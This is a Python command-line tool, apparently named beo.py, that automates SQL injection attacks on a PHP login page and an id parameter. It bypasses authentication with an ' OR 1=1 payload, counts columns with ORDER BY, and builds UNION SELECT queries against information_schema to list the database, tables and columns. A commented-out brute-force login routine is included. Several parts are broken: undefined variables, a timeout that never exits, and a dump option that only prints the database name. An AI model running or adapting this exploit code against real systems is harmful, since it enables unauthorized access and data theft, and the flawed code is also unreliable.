import requests
from bs4 import BeautifulSoup
import getopt
import sys
import time
import re
import time

TARGET = ''
URL = ''
DATABASE = False
TABLE = False
DUMP = False
LINK=''
CSRF=''
SESSION=requests.Session()
column=0
x=0

def validate_url():
    global TARGET,LINK,CSRF,URL
    LINK="http://"+TARGET+"/"+URL
    request=SESSION.get(LINK)
    if request.status_code!=200:
        print("[-] The requested URL not found")
        sys.exit()
    else:
        soup=BeautifulSoup(request.content,'html.parser')
        CSRF=soup.find('input',{'name':'csrf_token'})['value']

def sql_injection():
    global LINK,CSRF,SESSION
    link_sqli="http://"+TARGET+"/"+'auth/auth.php'
    print("[*] Try Login the website using SQL Injection Attack")
    payload={
                'csrf_token':CSRF,
                'username':"' OR 1=1 LIMIT 1 #",
                'password':"abc",
                'action':'login'
    }
    request=SESSION.post(link_sqli,data=payload)
    temp="http://"+TARGET+"/"+"login.php"
    if request.url==temp:
        print("[-] Failed to get authentication")
    else:
        print("[+] The website is vulnerable to SQL Injection Attack.\n[+] Successfully getting the website authentication with PHPSESSID value {}".format(SESSION.cookies["PHPSESSID"]))

def get_column():
    global TARGET,SESSION,column,URL,x
    print("[+] Generate total column for union-based SQL Injection Attack")
    temp="http://"+TARGET+'/'+URL+" ORDER BY {}"
    start=time.time()
    ctr=1
    #while time.time()-start<=10:
    #format_url=temp.format(ctr)
    while True:
        if time.time()-start>10:
            print("[-] Processed for {} seconds and not able to determine the total column.\n[-] The target URL is not vulnerable to union-based SQL Injection Attack".format(time.time()-start))
        obj=temp.format(ctr)
        format_response = SESSION.get(obj)
        format_object = BeautifulSoup(format_response.text,'html.parser')
        comment = format_object.find('h3')
        if comment is None:
            column = ctr-1
            x=1
            return column
        ctr=ctr+1
    # if x==0:
    #     print("[-] Processed for {} seconds and not able to determine the total column.\n[-] The target URL is not vulnerable to union-based SQL Injection Attack".format(time.time()-start))

def dumpURL():
    global URL,column
    dump_url="http://"+TARGET+"/"+URL+" UNION SELECT "
    for i in range(1,column+1):
        dump_url=dump_url+str(i)
        if i!=column:
            dump_url=dump_url+','
    return dump_url



# def union_attack():
#     global TARGET,SESSION,column,URL,x
#     urlfull=dumpURL()
#     temp=urlfull
#     obj=temp.format(ctr)
#     format_response = SESSION.get(obj)
#     format_object = BeautifulSoup(format_response.text,'html.parser')
#     comment = format_object.find('div',{'class':'container content'})
#     print("[+] Launch union-based SQL Injection Attack at URL {}".format(temp))
#     if comment is None:
#         column = ctr-1
#         x=1
#         break
#     ctr=ctr+1


# def brute_force():
#     for x in wordlist:
#         for y in wordlist:
#             payload = {
#                 '_token' : csrf_token,
#                 'username' : x,
#                 'password': y
#             }

#             hashed = hashlib.md5(y.encode()).hexdigest()
#             print(hashed)
#             response = session.post(url + login_action_url, data = payload)

#             if response.url != url + '/login.php':
#                 return x,y
#     return None,None

def dumbtable():
    displaydb()

def displaydb():
    urlfull=dumpURL()+" LIMIT 1,1"
    database_url = urlfull.replace('5','DATABASE()')
    db_web = SESSION.get(database_url)
    db_soup = BeautifulSoup(db_web.text,'html.parser')
    content = db_soup.find_all('span')
    # for isi in content:
    #     print (isi.text.strip())
    
    print("DB Name:" +content[2].text.strip())
    return content[2].text.strip()

def getTable():
    urlfull=dumpURL()
    dbname=displaydb()
    table_url = urlfull+" from information_schema.tables where table_schema='"+dbname+"' LIMIT 1,1"
    table_url = table_url.replace('4','group_concat(table_name)')
    table_web = SESSION.get(table_url)
    #print(table_url)
    table_soup = BeautifulSoup(table_web.text,'html.parser')
    #print(table_soup)
    content = table_soup.find_all('b',{'class':'text-blue'})
    print(content[0].text.strip())
    tables = content[0].text.strip()
    return tables.split(',')

def getCreatedTime():
    urlfull=dumpURL()
    dbname=displaydb()
    table_url = urlfull+" from information_schema.tables where table_schema='"+dbname+"' LIMIT 1,1"
    table_url = table_url.replace('5','group_concat(create_time)')
    table_web = SESSION.get(table_url)
    #print(table_url)
    table_soup = BeautifulSoup(table_web.text,'html.parser')
    #print(table_soup)
    content = table_soup.find_all('span')
    print("Table {} Name =".format(y) + content[2].text.strip())
    

def getColumnName():
    tables=getTable()
    print(tables)
    dbname=displaydb()
    for table in tables:
        urlfull=dumpURL()   
        column_url = urlfull+" from information_schema.columns where table_schema='"+dbname
        column_url = column_url + "' and table_name='" +table+"' LIMIT 1,1"
        column_url = column_url.replace('4','group_concat(column_name)')
        #print(column_url)
        column_web = SESSION.get(column_url)
        column_soup = BeautifulSoup(column_web.text,'html.parser')
        #print(column_soup)
        content = column_soup.find_all('b',{'class':'text-blue'})
        #print(content)
        # for isi in content:
        #     print (isi.text.strip())
        print("Column Name:"+content[0].text.strip())
    for table in tables:
        urlfull=dumpURL()   
        column_url = urlfull+" from information_schema.columns where table_schema='"+dbname
        column_url = column_url + "' and table_name='" +table+"' LIMIT 1,1"
        column_url = column_url.replace('4','group_concat(column_type)')
        #print(column_url)
        column_web = SESSION.get(column_url)
        column_soup = BeautifulSoup(column_web.text,'html.parser')
        #print(column_soup)
        content = column_soup.find_all('b',{'class':'text-blue'})
        #print(content)
        # for isi in content:
        #     print (isi.text.strip())
        print("Column Type:{}".format(x)+content[0].text.strip())

def  displaytable():
    getTable()
    getCreatedTime()
    getColumnName()

def help():
    print("""Usage: beo.py [-t/--target IP Address/DNS] [-u/--url URL] [OPTIONS]
        
        -h, --help                                      Show basic help message and exit
        -t IP Address/DNS, .-target=IP Address/DNS      Set IP Address or DNS (e.g 127.0.0.1)
        -u URL, --url=URL                               Set website URL (e.g. web/index.php?id=1) -U URL, .-url=URL
        
        Options:
        --db                                            Show the current database name
        --tc                                            Show all tables name, table create time and columns from the current database
        --dump                                          Show all table name and entries data from the current database

        Example:
        beo.py -h
        beo.py - -help
        beo.py-t 127.0.0.1 -u web/index.php?id=1 --db
        beo.py --target=127.0.0.1 -url=web/index.php?id=l --db
        beo.py-t 127.0.0.1 -u web/index.php?id=l --tc
        beo.py .-target=127.0.0.1 -url=web/index.php?id=l --tc
        beo.py-t 127.0.0.1 -u web/index.php?id=l --dump
        beo.py --target=127.0.0.1 -url=web/index.php?id=1 - -dump
        beo.py-t 127.0.0.1 -u web/index.php?id=l --db .-tc --dump
        beo.py . -target=127.0.0.1 -url=web/index.php?id=l --db --tc --dump
        """)


def main():
    global TARGET,URL,DATABASE,TABLE,DUMP,LINK
    
    if not len(sys.argv[1:]):
        help()
        sys.exit()
    
    try:
        args, _ = getopt.getopt(sys.argv[1:],"t:u:h" ,['target=','url=','help','db','tc','dump'])
    except:
        getopt.GetoptError(EnvironmentError)

    for key,value in args:
        if key=='-t' or key=='--target':
            TARGET = value
        if key=='-h' or key=='--help':
            help()
        if key=='-u' or key=='--url':
            URL = value
        if key=='--db':
            DATABASE = True
        if key=='--tc':
            TABLE = True
        if key=='--dump':
            DUMP = True
        
    if TARGET=='' and URL=='':
        print("-t/--target or -u/--url argument is required")

    validate_url()
    print(URL)
    sql_injection()
    
    print(get_column())
    print(dumpURL())
    if DATABASE==True:
        displaydb()
    if TABLE==True:
        displaytable()
    if DUMP ==True:
        dumbtable()
        
    sys.exit()

if __name__ == "__main__":
    main()